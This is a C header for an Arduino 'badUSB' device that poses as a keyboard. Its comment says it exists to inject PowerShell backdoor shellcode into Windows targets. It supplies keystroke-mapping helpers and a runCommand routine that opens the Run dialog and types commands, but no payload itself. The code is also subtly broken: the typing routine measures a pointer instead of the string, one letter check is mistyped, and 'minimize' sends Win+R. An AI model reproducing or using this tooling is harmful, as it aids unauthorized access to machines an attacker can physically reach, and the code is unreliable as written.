/*
	badUSB for physical vector attacks.
	Based on Atmel VUSB.
	Based on Obdev's AVRUSB code and under the same license.
	File Author: Pranjal Joshi [only badUSB.h is written by me]
	Date: 17/08/2015
	Open source project.
	Objective: 	To exploit windows target machine by injecting backdoor shellcode into powershell
				generated using kali linux tools. Arduino is used as HID keyboard to automate this
				process of shellcode injection.
*/

#ifndef __badUSB_h__
#define __badUSB_h__

#include "UsbKeyboard.h"
#include "Arduino.h"

// EXTRA KEY DEFINATIONS ADDED.
// DIRECTIONS
#define KEY_ARROW_LEFT 0x50
#define KEY_ARROW_RIGHT 0x4F
#define KEY_ARROW_UP 0x52
#define KEY_ARROW_DOWN 0x4E
#define KEY_TAB 43
#define KEY_DELETE 76
// SYMBOLS
#define KEY_DASH 45
#define KEY_EQUAL 46
#define KEY_OPENING_SQR 47
#define KEY_CLOSING_SQR 48
#define KEY_BACKSLASH 49
#define KEY_SEMICOLON 51
#define KEY_SINGLE_QUOTE 52
#define KEY_NON_US 50
#define KEY_COMMA 54
#define KEY_FULLSTOP 55
#define KEY_SLASH 56

void usbDelay(unsigned long ms)
{
  for(unsigned long i=0;i<ms;i++)
    delayMicroseconds(1000);
}

void usbPrint(char* str)
{
	long size = sizeof(str);
	long i;
	for(i=0;i<size;i++)
	{
		// alphabets : windows targets are not case sensitive hence using lowerCase format
		if(str[i] == 'a' || str[i] == 'A')
			UsbKeyboard.sendKeyStroke(KEY_A);
		else if(str[i] == 'b' || str[i] == 'B')
			UsbKeyboard.sendKeyStroke(KEY_B);
		else if(str[i] == 'c' || str[i] == 'C')
			UsbKeyboard.sendKeyStroke(KEY_C);
		else if(str[i] == 'd' || str[i] == 'D')
			UsbKeyboard.sendKeyStroke(KEY_D);
		else if(str[i] == 'e' || str[i] == 'E')
			UsbKeyboard.sendKeyStroke(KEY_E);
		else if(str[i] == 'f' || str[i] == 'F')
			UsbKeyboard.sendKeyStroke(KEY_F);
		else if(str[i] == 'g' || str[i] == 'G')
			UsbKeyboard.sendKeyStroke(KEY_G);
		else if(str[i] == 'h' || str[i] == 'H')
			UsbKeyboard.sendKeyStroke(KEY_H);
		else if(str[i] == 'i' || str[i] == 'I')
			UsbKeyboard.sendKeyStroke(KEY_I);
		else if(str[i] == 'j' || str[i] == 'J')
			UsbKeyboard.sendKeyStroke(KEY_J);
		else if(str[i] == 'k' || str[i] == 'K')
			UsbKeyboard.sendKeyStroke(KEY_K);
		else if(str[i] == 'l' || str[i] == 'L')
			UsbKeyboard.sendKeyStroke(KEY_L);
		else if(str[i] == 'm' || str[i] == 'M')
			UsbKeyboard.sendKeyStroke(KEY_M);
		else if(str[i] == 'n' || str[i] == 'N')
			UsbKeyboard.sendKeyStroke(KEY_N);
		else if(str[i] == 'o' || str[i] == 'O')
			UsbKeyboard.sendKeyStroke(KEY_O);
		else if(str[i] == 'p' || str[i] == 'P')
			UsbKeyboard.sendKeyStroke(KEY_P);
		else if(str[i] == 'q' || str[i] == 'Q')
			UsbKeyboard.sendKeyStroke(KEY_Q);
		else if(str[i] == 'r' || str[i] == 'R')
			UsbKeyboard.sendKeyStroke(KEY_R);
		else if(str[i] == 's' || str[i] == 'S')
			UsbKeyboard.sendKeyStroke(KEY_S);
		else if(str[i] == 't' || str[i] == 'T')
			UsbKeyboard.sendKeyStroke(KEY_T);
		else if(str[i] == 'u' || str[i] == 'u')
			UsbKeyboard.sendKeyStroke(KEY_U);
		else if(str[i] == 'v' || str[i] == 'V')
			UsbKeyboard.sendKeyStroke(KEY_V);
		else if(str[i] == 'w' || str[i] == 'W')
			UsbKeyboard.sendKeyStroke(KEY_W);
		else if(str[i] == 'x' || str[i] == 'X')
			UsbKeyboard.sendKeyStroke(KEY_X);
		else if(str[i] == 'y' || str[i] == 'Y')
			UsbKeyboard.sendKeyStroke(KEY_Y);
		else if(str[i] == 'z' || str[i] == 'Z')
			UsbKeyboard.sendKeyStroke(KEY_Z);
		
		// Numbers
		else if(str[i] == '0')
			UsbKeyboard.sendKeyStroke(KEY_0);
		else if(str[i] == '1')
			UsbKeyboard.sendKeyStroke(KEY_1);
		else if(str[i] == '2')
			UsbKeyboard.sendKeyStroke(KEY_2);
		else if(str[i] == '3')
			UsbKeyboard.sendKeyStroke(KEY_3);
		else if(str[i] == '4')
			UsbKeyboard.sendKeyStroke(KEY_4);
		else if(str[i] == '5')
			UsbKeyboard.sendKeyStroke(KEY_5);
		else if(str[i] == '6')
			UsbKeyboard.sendKeyStroke(KEY_6);
		else if(str[i] == '7')
			UsbKeyboard.sendKeyStroke(KEY_7);
		else if(str[i] == '8')
			UsbKeyboard.sendKeyStroke(KEY_8);
		else if(str[i] == '9')
			UsbKeyboard.sendKeyStroke(KEY_9);
		
		// Shift + Numbers = Symbols
		else if(str[i] == ')')
			UsbKeyboard.sendKeyStroke(KEY_0, MOD_SHIFT_LEFT);
		else if(str[i] == '!')
			UsbKeyboard.sendKeyStroke(KEY_1, MOD_SHIFT_LEFT);
		else if(str[i] == '@')
			UsbKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
		else if(str[i] == '#')
			UsbKeyboard.sendKeyStroke(KEY_3, MOD_SHIFT_LEFT);
		else if(str[i] == '$')
			UsbKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
		else if(str[i] == '%')
			UsbKeyboard.sendKeyStroke(KEY_5, MOD_SHIFT_LEFT);
		else if(str[i] == '^')
			UsbKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
		else if(str[i] == '&')
			UsbKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
		else if(str[i] == '*')
			UsbKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
		else if(str[i] == '(')
			UsbKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
		
		// SPECIAL SYMBOLS
		else if(str[i] == '-')
			UsbKeyboard.sendKeyStroke(KEY_DASH);
		else if(str[i] == '=')
			UsbKeyboard.sendKeyStroke(KEY_EQUAL);
		else if(str[i] == ';')
			UsbKeyboard.sendKeyStroke(KEY_SEMICOLON);
		else if(str[i] == '\'')
			UsbKeyboard.sendKeyStroke(KEY_SINGLE_QUOTE);
		else if(str[i] == ',')
			UsbKeyboard.sendKeyStroke(KEY_COMMA);
		else if(str[i] == '.')
			UsbKeyboard.sendKeyStroke(KEY_FULLSTOP);
		else if(str[i] == '/')
			UsbKeyboard.sendKeyStroke(KEY_SLASH);
		else if(str[i] == '[')
			UsbKeyboard.sendKeyStroke(KEY_OPENING_SQR);
		else if(str[i] == ']')
			UsbKeyboard.sendKeyStroke(KEY_CLOSING_SQR);
		else if(str[i] == '\\')
			UsbKeyboard.sendKeyStroke(KEY_BACKSLASH);
		
		else if(str[i] == '_')
			UsbKeyboard.sendKeyStroke(KEY_DASH, MOD_SHIFT_LEFT);
		else if(str[i] == '+')
			UsbKeyboard.sendKeyStroke(KEY_EQUAL, MOD_SHIFT_LEFT);
		else if(str[i] == ':')
			UsbKeyboard.sendKeyStroke(KEY_SEMICOLON, MOD_SHIFT_LEFT);
		else if(str[i] == '"')
			UsbKeyboard.sendKeyStroke(KEY_SINGLE_QUOTE, MOD_SHIFT_LEFT);
		else if(str[i] == '<')
			UsbKeyboard.sendKeyStroke(KEY_COMMA, MOD_SHIFT_LEFT);
		else if(str[i] == '>')
			UsbKeyboard.sendKeyStroke(KEY_FULLSTOP, MOD_SHIFT_LEFT);
		else if(str[i] == '?')
			UsbKeyboard.sendKeyStroke(KEY_SLASH, MOD_SHIFT_LEFT);
		else if(str[i] == '{')
			UsbKeyboard.sendKeyStroke(KEY_OPENING_SQR, MOD_SHIFT_LEFT);
		else if(str[i] == '}')
			UsbKeyboard.sendKeyStroke(KEY_CLOSING_SQR, MOD_SHIFT_LEFT);
		else if(str[i] == '|')
			UsbKeyboard.sendKeyStroke(KEY_BACKSLASH, MOD_SHIFT_LEFT);
	}
}

void minimize()
{
	UsbKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
}

void maximize()
{
	UsbKeyboard.sendKeyStroke(KEY_M, MOD_SHIFT_LEFT | MOD_GUI_LEFT);
}

void closeWindow()
{
	UsbKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}

void taskManager()
{
	UsbKeyboard.sendKeyStroke(KEY_DELETE, MOD_ALT_LEFT | MOD_CONTROL_LEFT);
	usbDelay(500);
	UsbKeyboard.sendKeyStroke(KEY_TAB);
	UsbKeyboard.sendKeyStroke(KEY_TAB);
	UsbKeyboard.sendKeyStroke(KEY_TAB);
	UsbKeyboard.sendKeyStroke(KEY_ENTER);
}

void runCommand(char* cmd)
{
	UsbKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	usbDelay(1000);
	usbPrint(cmd);
	UsbKeyboard.sendKeyStroke(KEY_ENTER);
}

void execute()
{
	UsbKeyboard.sendKeyStroke(KEY_ENTER);
}

#endif